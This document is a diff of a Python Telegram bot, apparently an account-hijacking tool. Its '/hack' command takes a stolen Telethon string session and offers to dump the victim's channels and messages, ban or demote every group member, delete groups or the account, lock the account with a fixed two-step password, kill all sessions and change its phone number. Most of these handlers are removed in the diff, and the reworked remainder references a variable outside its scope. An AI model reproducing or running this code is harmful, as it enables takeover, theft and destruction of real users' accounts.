@@ -3,6 +3,7 @@ import os
 import re
 from os import system
 
+import telethon
 from telethon import Button
 from telethon import TelegramClient as tg
 from telethon import events, functions, types
@@ -230,296 +231,56 @@ Reply To My Message If I am using In Group
 I will add more features Later 😅
 """
 
-"""       
-@tgbot.on(events.NewMessage(pattern="/hack", func=lambda x: x.sender_id == bot.uid))
-async def op(event):
-  legendboy = [
-    [
-      Button.url("Click Here", "https://t.me/{Bot_Username}")
-      ]
-    ]         
-  await event.reply("Only My Owner", buttons=legendboy)
-"""
-
-
 @tgbot.on(events.NewMessage(pattern="/hack", func=lambda x: x.sender_id == bot.uid))
 async def start(event):
-    global menu
-    async with bot.conversation(event.chat_id) as x:
-        keyboard = [
-            [
-                Button.inline("A", data="A"),
-                Button.inline("B", data="B"),
-                Button.inline("C", data="C"),
-                Button.inline("D", data="D"),
-                Button.inline("E", data="E"),
-            ],
-            [
-                Button.inline("F", data="F"),
-                Button.inline("G", data="G"),
-                Button.inline("H", data="H"),
-                Button.inline("I", data="I"),
-                Button.inline("J", data="J"),
-            ],
-            [
-                Button.inline("K", data="K"),
-                Button.inline("L", data="L"),
-                Button.inline("M", data="M"),
-            ],
-            [Button.url("Owner", "https://t.me/The_LegendBoy")],
+  global menu
+  async with tgbot.conversation(event.chat_id) as x:
+    keyboard = [
+      [  
+        Button.inline("A", data="A"), 
+        Button.inline("B", data="B"),
+        Button.inline("C", data="C"),
+        Button.inline("D", data="D"),
+        Button.inline("E", data="E")
+        ],
+      [
+        Button.inline("F", data="F"), 
+        Button.inline("G", data="G"),
+        Button.inline("H", data="H"),
+        Button.inline("I", data="I"),
+        Button.inline("J", data="J")
+        ],
+      [
+        Button.inline("K", data="K"), 
+        Button.inline("L", data="L"),
+        Button.inline("M", data="M")
+        ],
+      [
+        Button.url("Owner", "https://t.me/The_LegendBoy")
         ]
-        await x.send_message(
-            f"Choose what you want with string session \n\n{menu}", buttons=keyboard
-        )
-
+    ]
+    await x.send_message(f"Choose what you want with string session \n\n{menu}", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"A")))
 async def users(event):
-    async with bot.conversation(event.chat_id) as x:
-        await x.send_message("📍GIVE STRING SESSION")
-        strses = await x.get_response()
-        op = await cu(strses.text)
-        if op:
-            pass
-        else:
-            return await event.respond(
-                "This StringSession Has Been Terminated.\n /hack"
-            )
-        try:
-            i = await userchannels(strses.text)
-        except:
-            return await event.reply("This StringSession Has Been Terminated.\n/hack")
-        if len(i) > 3855:
-            file = open("session.txt", "w")
-            file.write(i + "\n\nDetails BY LegendBoy")
-            file.close()
-            await bot.send_file(event.chat_id, "session.txt")
-            system("rm -rf session.txt")
-        else:
-            await event.reply(i + "\n\nThanks For using LegendBoyBot. \n/hack")
-
-
-@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
-async def users(event):
-    async with bot.conversation(event.chat_id) as x:
-        await x.send_message("🔰GIVE STRING SESSION")
-        strses = await x.get_response()
-        op = await cu(strses.text)
-        if op:
-            pass
-        else:
-            return await event.respond("This StringSession Has Been Terminated.\n/hack")
-        i = await userinfo(strses.text)
-        await event.reply(i + "\n\nThanks For using LegendBoy Bot.\n/hack")
-
-
-@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
-async def users(event):
-    async with bot.conversation(event.chat_id) as x:
-        await x.send_message("GIVE STRING SESSION")
-        strses = await x.get_response()
-        op = await cu(strses.text)
-        if op:
-            pass
-        else:
-            return await event.respond("ingSessio")
-        await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
-        grpid = await x.get_response()
-        await userbans(strses.text, grpid.text)
-        await event.reply("Banning all members. Thanks For using LegendBoy Bot")
-
-
-@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"D")))
-async def users(event):
-    async with bot.conversation(event.chat_id) as x:
-        await x.send_message("GIVE STRING SESSION")
-        strses = await x.get_response()
-        op = await cu(strses.text)
-        if op:
-            pass
-        else:
-            return await event.respond("This StringSession Has Been Terminated.\n/hack")
-        i = await usermsgs(strses.text)
-        await event.reply(i + "\n\nThanks For using LegendBoy Bot")
-
-
-@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
-async def users(event):
-    async with bot.conversation(event.chat_id) as x:
-        await x.send_message("GIVE STRING SESSION")
-        strses = await x.get_response()
-        op = await cu(strses.text)
-        if op:
-            pass
-        else:
-            return await event.respond("This StringSession Has Been Terminated.\n/hack")
-        await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
-        grpid = await x.get_response()
-        await joingroup(strses.text, grpid.text)
-        await event.reply(
-            "Joined the Channel/Group Thanks For using LegendBoy Bot.\n/hack"
-        )
-
-
-@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"F")))
-async def users(event):
-    async with bot.conversation(event.chat_id) as x:
-        await x.send_message("GIVE STRING SESSION")
-        strses = await x.get_response()
-        op = await cu(strses.text)
-        if op:
-            pass
-        else:
-            return await event.respond("This StringSession Has Been Terminated.\n/hack")
-        await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
-        grpid = await x.get_response()
-        await leavegroup(strses.text, grpid.text)
-        await event.reply("Leaved the Channel/Group Thanks For using Boy Bot.\n/hack")
-
-
-@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"G")))
-async def users(event):
-    async with bot.conversation(event.chat_id) as x:
-        await x.send_message("GIVE STRING SESSION")
-        strses = await x.get_response()
-        op = await cu(strses.text)
-        if op:
-            pass
-        else:
-            return await event.respond("This StringSession Has Been Terminated.\n/hack")
-        await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
-        grpid = await x.get_response()
-        await delgroup(strses.text, grpid.text)
-        await event.reply(
-            "Deleted the Channel/Group Thanks For using LegendBoyBot.\n/hack"
-        )
-
-
-@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
-async def users(event):
-    async with bot.conversation(event.chat_id) as x:
-        await x.send_message("GIVE STRING SESSION")
-        strses = await x.get_response()
-        op = await cu(strses.text)
-        if op:
-            pass
-        else:
-            return await event.respond("This StringSession is terminated maybe.\n/hack")
-        i = await user2fa(strses.text)
-        if i:
-            await event.reply(
-                "User don't have two step thats why now two step is `LegendBoy Bot Is best` you can login now\n\nThanks For using LegendBoy Bot.\n/hack"
-            )
-        else:
-            await event.reply("Sorry User Have two step already")
-
-
-@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"I")))
-async def users(event):
-    async with bot.conversation(event.chat_id) as x:
-        await x.send_message("GIVE STRING SESSION")
-        strses = await x.get_response()
-        op = await cu(strses.text)
-        if op:
-            pass
-        else:
-            return await event.respond("This StringSession Has Been Terminated.\n/hack")
-        await terminate(strses.text)
-        await event.reply(
-            "The all sessions are terminated\n\nThanks For using LegendBoyBot.\n/hack"
-        )
-
-
-@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
-async def users(event):
-    async with bot.conversation(event.chat_id) as x:
-        await x.send_message("GIVE STRING SESSION")
-        strses = await x.get_response()
-        op = await cu(strses.text)
-        if op:
-            pass
-        else:
-            return await event.respond("This StringSession Has Been Terminated.\n/hack")
-        await delacc(strses.text)
-        await event.reply(
-            "The Account is deleted SUCCESSFULLLY\n\nThanks For using LegendBoy Bot.\n/hack"
-        )
-
-
-@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"K")))
-async def users(event):
-    async with bot.conversation(event.chat_id) as x:
-        await x.send_message("GIVE STRING SESSION")
-        strses = await x.get_response()
-        op = await cu(strses.text)
-        if op:
-            pass
-        else:
-            return await event.respond("This StringSession Has Been Terminated.\n/hack")
-        await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
-        grp = await x.get_response()
-        await x.send_message("NOW GIVE USER USERNAME")
-        user = await x.get_response()
-        await promote(strses.text, grp.text, user.text)
-        await event.reply(
-            "I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For Using LegendBoy Bot.\n/hack"
-        )
-
-
-@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"L")))
-async def users(event):
-    async with bot.conversation(event.chat_id) as x:
-        await x.send_message("GIVE STRING SESSION")
-        strses = await x.get_response()
-        op = await cu(strses.text)
-        if op:
-            pass
-        else:
-            return await event.respond("This StringSession Has Been Terminated.\n/hack")
-        await x.send_message("NOW GIVE GROUP/CHANNEL USERNAME")
-        pro = await x.get_response()
-        try:
-            await demall(strses.text, pro.text)
-        except:
-            pass
-        await event.reply(
-            "I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using LegendBoyBot.\n/hack"
-        )
-
-
-@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"M")))
-async def users(event):
-    async with bot.conversation(event.chat_id) as x:
-        await x.send_message("GIVE STRING SESSION")
-        strses = await x.get_response()
-        op = await cu(strses.text)
-        if op:
-            pass
-        else:
-            return await event.respond("This StringSession is terminated maybe\n/hack")
-        await x.send_message(
-            "GIVE NUMBER WHICH YOU WANT TO CHANGE\n[NOTE: DONT USE 2ndline or text now numbers]\n[if you are use 2nd line or text now you can't get otp] "
-        )
-        number = (await x.get_response()).text
-        try:
-            result = await change_number(strses.text, number)
-            await event.respond(
-                result
-                + "\n copy the phone code hash and check your number you got otp\ni stop for 20 sec copy phone code hash and otp"
-            )
-            await asyncio.sleep(20)
-            await x.send_message("NOW GIVE PHONE CODE HASH")
-            phone_code_hash = (await x.get_response()).text
-            await x.send_message("NOW GIVE THE OTP")
-            otp = (await x.get_response()).text
-            changing = await change_number_code(
-                strses.text, number, phone_code_hash, otp
-            )
-            if changing:
-                await event.respond("CONGRATULATIONS NUMBER WAS CHANGED")
-            else:
-                await event.respond("Something is wrong")
-        except Exception as e:
-            await event.respond(
-                "SEND THIS ERROR TO - @Legend_Userbot\n**LOGS**\n" + str(e)
-            )
+  async with tgbot.conversation(event.chat_id) as x:
+      await x.send_message("📍GIVE STRING SESSION")
+      strses = await x.get_response()
+      op = await cu(strses.text)
+      if op:
+        pass
+      else:
+        return await event.respond("This StringSession Has Been Terminated.\n /hack", buttons=keyboard)
+      try:
+        i = await userchannels(strses.text)
+      except:
+        return await event.reply("This StringSession Has Been Terminated.\n/hack", buttons=keyboard)
+      if len(i) > 3855:
+        file = open("session.txt", "w")
+        file.write(i + "\n\nDetails BY LegendBoy")
+        file.close()
+        await bot.send_file(event.chat_id, "session.txt")
+        system("rm -rf session.txt")
+      else:
+        await event.reply(i + "\n\nThanks For using LegendBoyBot. \n/hack", buttons=keyboard)
+      
